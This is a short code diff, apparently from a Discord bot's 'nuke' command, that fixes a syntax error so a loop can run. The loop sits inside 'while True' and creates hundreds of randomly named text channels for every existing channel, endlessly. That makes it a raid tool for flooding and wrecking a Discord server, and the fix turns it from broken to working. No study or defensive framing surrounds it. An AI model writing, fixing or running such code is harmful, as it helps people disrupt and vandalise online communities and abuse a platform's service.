@@ -45,7 +45,7 @@ async def nuke (ctx):
         await guild.create_text_channel(random.choice(channel_names))
     while True:
         for channel in guild.text_channels:
-            for i range (500):
+            for i in range (500):
                 await guild.create_text_channel(random.choice(channel_names))
         
 client.run(token)
